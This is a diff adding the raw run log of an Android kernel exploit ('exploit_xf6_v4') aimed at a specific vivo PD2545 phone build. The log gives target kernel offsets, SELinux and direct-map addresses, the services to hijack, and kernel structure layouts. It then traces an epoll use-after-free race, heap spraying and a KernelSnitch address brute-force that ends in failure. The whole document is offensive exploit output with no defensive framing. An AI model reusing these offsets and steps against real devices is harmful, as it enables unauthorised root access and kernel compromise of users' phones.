@@ -1,0 +1,72 @@
+TRACE ms=25245358 pid=27840 tid=27840 cpu=7 stage=race_config event=cpu_pair main=2 trigger=3 (MT6993: cluster0={0,1,2,3} cluster1={4,5,6} cluster2={7} 单核不可配对)
+TRACE ms=25245359 pid=27840 tid=27840 cpu=7 stage=startup event=mode mode=probe_epoll argc=4
+TRACE ms=25245359 pid=27840 tid=27840 cpu=7 stage=target event=identity release=6.12.58-android16-6-gdd6fd5c98918-abogki543627742-4k version=#1 SMP PREEMPT Wed Aug  5 14:45:35 UTC 2026 payload_sha256=2da8aeee19819a86062d0c4b42be8b6dce32eddefc1b8ee82d0ca5578b2b1daf payload_size=0x2764a00 arm64_image_size=0x2820000 kernel_static_base=0xffffffc080000000 selinux_image_off=0x27c6520 direct_map_base=0xffffff8000000000 phys_load_delta=0x0 direct_map_alias=0xffffff80027c6520 cmdline_token=product.version=PD2545_A_17.1.12.10.W10 vr_sha256=5b525400d4b2a4e54af8c716a0f216f4cddaaa504a54d08d9faf63a212ad74ab vr_vermagic=6.12.58-android16-6-g97704d7faadc-4k SMP preempt mod_unload modversions aarch64 carrier_sha256=740c53b4ef1cdd4effda33957d0c231c31097a246496e305725f2a45e914810c carrier_size=0x10c00 carrier_patch=0x9220 service_root_verified=1 full_static_ready=1 absolute_kernel_write=1 bootstrap_service=dumpstatez final_service=bugreportd
+TRACE ms=25245359 pid=27840 tid=27840 cpu=7 stage=startup event=resources fds=3 nofile_cur=32768 nofile_max=524288 nproc_cur=57842 nproc_max=57842 cpu_online=8 cpu_configured=8
+ENV uid=2000 gid=2000 context=u:r:shell:s0 page_size=4096 selinux=Enforcing uname=Linux 6.12.58-android16-6-gdd6fd5c98918-abogki543627742-4k #1 SMP PREEMPT Wed Aug  5 14:45:35 UTC 2026 aarch64
+ENV fingerprint=vivo/PD2545/PD2545:17/CP2A.260605.016_V000L1/261012214913:user/release-keys
+ENV carrier=/system/lib64/libdumpstateaidl.so bootstrap_service=dumpstatez final_service=bugreportd socket=/dev/socket/dumpstate payload_size=456 absolute_kernel_write=preset_direct_map address_source=target_profile direct_map_used=1
+TRACE ms=25245359 pid=27840 tid=27840 cpu=7 stage=environment event=mte hwcap2=0x51a8bc9af3ff hwcap2_mte=0 tagged_addr_ctrl=1 errno=0
+TRACE ms=25245359 pid=27840 tid=27840 cpu=7 stage=environment event=property name=ro.product.device value=PD2545 present=1
+TRACE ms=25245359 pid=27840 tid=27840 cpu=7 stage=environment event=property name=ro.boot.hardware value=mt6993 present=1
+TRACE ms=25245359 pid=27840 tid=27840 cpu=7 stage=environment event=property name=ro.build.version.incremental value=261012214913 present=1
+TRACE ms=25245359 pid=27840 tid=27840 cpu=7 stage=environment event=property name=ro.boot.verifiedbootstate value=green present=1
+TRACE ms=25245359 pid=27840 tid=27840 cpu=7 stage=environment event=cmdline path=/proc/cmdline value= console=tty0 root=/dev/ram nosoftlockup 8250.nr_uarts=4 log_buf_len=4m android_arch_task_struct_size=512 vmalloc=400M swiotlb=noforce firmware_class.path=/vendor/firmware cgroup.memory=nosocket,nokmem disable_dma32=on transparent_hugepage=never arm64.nomops hyp_trace_printk hyp_event=__hyp_printk kvm-arm.hyp_lm_size_mb=2000 kvm-arm.protected_prefault=9 kvm-arm.protected_modules=pkvm_mgmt,pkvm_tmem,pkvm_smmu,pkvm_mkp,pkvm_isp,pkvm_cmdq android_arch_task_struct_size=1136 loop.max_part=7 ufshcd_core.poll_queues=0 6379=00 arm64.nomte mtk_printk_ctrl.disable_uart=1 PMIC_UVLO=NoUVLO usb2jtag_mode=0 root=/dev/ram rtc_reset=0 vcore_dram_lv=0 bootopt=64S3,32N2,64N2 erofs.reserved_pages=256 product.version=PD2545_A_17.1.12.10.W10 fingerprint.abbr=16/BP2A.250605.031.A3 region_ver=W10 product.solution=MTK bootconfig product_state=4 ramoops.mem_address=0xaec00000 ramoops.mem_size=0x310000 ramoops.pmsg_size=0x100000 ramoops.console_size=0x200000 vivoboot.bootreason=reboot vivolog_flag=0 tier=0 bbk_dp=0 vivo_bsp_info.hwid=001011111 vivo_bsp_info.pcbid=MP_0.1 vivo_bsp_info.cpuinfo_index=0 vivo_bsp_info.regionmark=CN-ZH lcm_software_id=0x05259e sec_lcm_software_id=0x0401a6 ext_lcm_special_info=0x00 vhp pcp_thp_order=4 nomerge=1152M,4 mem=15232M memhp_default_state=online_movable bootconfig 
+TRACE ms=25245359 pid=27840 tid=27840 cpu=7 stage=environment event=bootconfig path=/proc/bootconfig readable=0 errno=13
+TRACE ms=25245359 pid=27840 tid=27840 cpu=7 stage=environment event=cgroup path=/proc/self/cgroup value=4:net_prio:/ 3:cpuset:/ 2:cpu:/ 1:blkio:/normal 0::/apps/inactive_bg 
+TRACE ms=25245359 pid=27840 tid=27840 cpu=7 stage=environment event=status path=/proc/self/status value=Name: exploit_xf6_v4 Umask: 0000 State: R (running) Tgid: 27840 Ngid: 0 Pid: 27840 PPid: 1610 TracerPid: 0 Uid: 2000 2000 2000 2000 Gid: 2000 2000 2000 2000 FDSize: 64 Groups: 1004 1007 1011 1015 1028 1078 1079 3001 3002 3003 3006 3009 3011 3012  Kthread: 0 VmPeak:  8671684 kB VmSize:  8671684 kB VmLck:        0 kB VmPin:        0 kB VmHWM:      804 kB VmRSS:      804 kB RssAnon:      240 kB RssFile:      332 kB RssShmem:      232 kB VmData:     1744 kB VmStk:      136 kB VmExe:      260 kB VmLib:        8 kB VmPTE:       68 kB VmSwap:        0 kB CoreDumping: 0 THP_enabled: 1 untag_mask: 0xffffffffffffff Threads: 1 SigQ: 0/57842 SigPnd: 0000000000000000 ShdPnd: 0000000000000000 SigBlk: 0000000080000000 SigIgn: 0000002800000000 SigCgt: 0000004000004003 CapInh: 0000000000000000 CapPrm: 0000000000000000 CapEff: 0000000000000000 CapBnd: 00000000008000c0 CapAmb: 0000000000000000 NoNewPrivs: 0 Seccomp: 0 Seccomp_filters: 0 Speculation_Store_Bypass: thread vulnerable SpeculationIndirectBranch: unknown Cpus_allowed: ff Cpus_allowed_list: 0-7 Mems_allowed: 1 Mems_allowed_list: 0 voluntary_ctxt_switches: 0 nonvoluntary_ctxt_switches: 1 
+TRACE ms=25245360 pid=27840 tid=27840 cpu=7 stage=target event=uname_check release_match=1 version_match=1 actual_release=6.12.58-android16-6-gdd6fd5c98918-abogki543627742-4k actual_version=#1 SMP PREEMPT Wed Aug  5 14:45:35 UTC 2026 machine=aarch64
+TRACE ms=25245360 pid=27840 tid=27840 cpu=7 stage=target event=vendor_binding required_token=product.version=PD2545_A_17.1.12.10.W10 present=1
+STAGE epoll_probe controlled_order3_page persistent_target_write=0
+WARN probe still exercises a kernel UAF race and may cause a recoverable kernel panic
+TRACE ms=25245360 pid=27840 tid=27840 cpu=7 stage=redirect event=spawn pid=27842 mode=zero target=0x0000000000000000 timeout_s=240
+TRACE ms=25245360 pid=27842 tid=27842 cpu=6 stage=late_refs event=affinity allowed=0,1,2,3,4,5,6,7 require_main=2 require_trigger=3
+TRACE ms=25245360 pid=27842 tid=27842 cpu=6 stage=late_refs event=static_layout eventpoll_size=0xd0 gen=0xa8 refs=0xb0 depth=0xb8 refcount=0xbc epitem_ep=0x48 epitem_fllink=0x50 mcast_sources=14 mcast_kernel_size=0xf8 pipe_buffer=0x28 pipe_flags=0x18 pipe_slots=32 pipe_ring=0x500 pipe_object=0x800
+FD_LIMIT_INITIAL cur=524288 max=524288 graph_only=24736
+TRACE ms=25245360 pid=27842 tid=27842 cpu=6 stage=late_refs_before_known_page event=resources fds=3 nofile_cur=524288 nofile_max=524288 nproc_cur=57842 nproc_max=57842 cpu_online=8 cpu_configured=8
+TRACE ms=25245366 pid=27842 tid=27842 cpu=0 stage=known_page event=config mm_btf_size=0x4c0 mm_cache_size=0x500 order=3 slab_bytes=0x8000 objects_per_slab=25 remainder=0x300 prepare=800 spray=150 pre=24 post=25 skb_len=65536
+TRACE ms=25245366 pid=27842 tid=27842 cpu=0 stage=known_page_prepare event=resources fds=3 nofile_cur=524288 nofile_max=524288 nproc_cur=57842 nproc_max=57842 cpu_online=8 cpu_configured=8
+TRACE ms=25245366 pid=27842 tid=27842 cpu=0 stage=known_page event=pids_current path=/sys/fs/cgroup/pids.current readable=0 errno=2
+TRACE ms=25245366 pid=27842 tid=27842 cpu=0 stage=known_page event=pids_max path=/sys/fs/cgroup/pids.max readable=0 errno=2
+TRACE ms=25245366 pid=27842 tid=27842 cpu=0 stage=known_page event=cgroup path=/proc/self/cgroup value=4:net_prio:/
+TRACE ms=25245366 pid=27842 tid=27842 cpu=0 stage=known_page event=mte_mode hwcap2=0x51a8bc9af3ff hw_mte=0 kasan_on=0 kasan_off=0 target_default_on=1 kernelsnitch_mte=0
+TRACE ms=25245367 pid=27842 tid=27842 cpu=0 stage=known_page event=phase_begin phase=prepare_children count=800
+TRACE ms=25245601 pid=27842 tid=27842 cpu=0 stage=known_page event=phase_end phase=prepare_children count=800 fds=803 elapsed_ms=235
+TRACE ms=25245601 pid=27842 tid=27842 cpu=0 stage=known_page event=phase_begin phase=spray_children count=150
+TRACE ms=25245650 pid=27842 tid=27842 cpu=0 stage=known_page event=phase_end phase=spray_children count=150 fds=953 elapsed_ms=284
+TRACE ms=25245650 pid=27842 tid=27842 cpu=0 stage=known_page event=kernelsnitch_setup mm_size=1280 order=3 threads=8 collisions=8 mte_candidate_search=0
+[33m[*] [0mparameters cpu (16) mm_struct sz (500) mm slab order (3) thread cnt (8) collisions (8) mte disabled
+TRACE ms=25245651 pid=27842 tid=27842 cpu=0 stage=known_page event=phase_begin phase=collision_shape pre=24 post=25
+[33m[*] [0mchild kernelsnitch_find_collisions start
+TRACE ms=25245706 pid=27842 tid=27842 cpu=0 stage=known_page event=phase_end phase=collision_shape fds=1003 elapsed_ms=340
+TRACE ms=25245706 pid=27842 tid=27842 cpu=0 stage=known_page event=phase_begin phase=release_shape_objects
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    00000073dfbdb0c8
+[33m[*] [0m  00000061ce5bedf0
+[33m[*] [0m  00000061ce620100
+[33m[*] [0m  00000061ce6ca650
+[33m[*] [0m  00000061cea341a0
+[33m[*] [0m  00000061cf2190c8
+[33m[*] [0m  00000061cf6ad568
+[33m[*] [0m  00000061cf8ff7f8
+[33m[*] [0mfound 7 collisisons
+[33m[*] [0mchild kernelsnitch_find_collisions done
+TRACE ms=25250220 pid=27842 tid=27842 cpu=0 stage=known_page event=collision_result found=1 fds=1003 elapsed_ms=4854
+TRACE ms=25250220 pid=27842 tid=27842 cpu=0 stage=known_page event=phase_begin phase=skb_reclaim
+TRACE ms=25250220 pid=27842 tid=27842 cpu=0 stage=known_page event=skb_geometry user_len=0x10000 linear=0xe80 order3_frag=0x8000 sndbuf_min=0x11d80 sndbuf_before=0x38000 sndbuf_after=0x38000
+TRACE ms=25250220 pid=27842 tid=27842 cpu=0 stage=known_page event=send_order3_skb fd=1005 result=65536 expected=65536 errno=13 elapsed_ms=0
+TRACE ms=25250221 pid=27842 tid=27842 cpu=0 stage=known_page event=skb_geometry user_len=0x10000 linear=0xe80 order3_frag=0x8000 sndbuf_min=0x11d80 sndbuf_before=0x38000 sndbuf_after=0x38000
+TRACE ms=25250221 pid=27842 tid=27842 cpu=0 stage=known_page event=send_order3_skb fd=1003 result=65536 expected=65536 errno=13 elapsed_ms=0
+TRACE ms=25250222 pid=27842 tid=27842 cpu=0 stage=known_page event=phase_begin phase=address_bruteforce fds=950
+[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8200000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8200000000-ffffff8400000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8400000000-ffffff8600000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8a00000000-ffffff8c00000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8c00000000-ffffff8e00000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff8600000000-ffffff8800000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff8e00000000-ffffff9000000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8800000000-ffffff8a00000000]
+[33m[*] [0mdone
+[31m[!] [0mKernelSnitch address phase failed
+TRACE ms=25251397 pid=27840 tid=27840 cpu=6 stage=wait_child event=exit pid=27842 rc=255 process_group=1
+TRACE ms=25251398 pid=27840 tid=27840 cpu=6 stage=redirect event=complete pid=27842 mode=zero target=0x0000000000000000 rc=255 elapsed_ms=6038
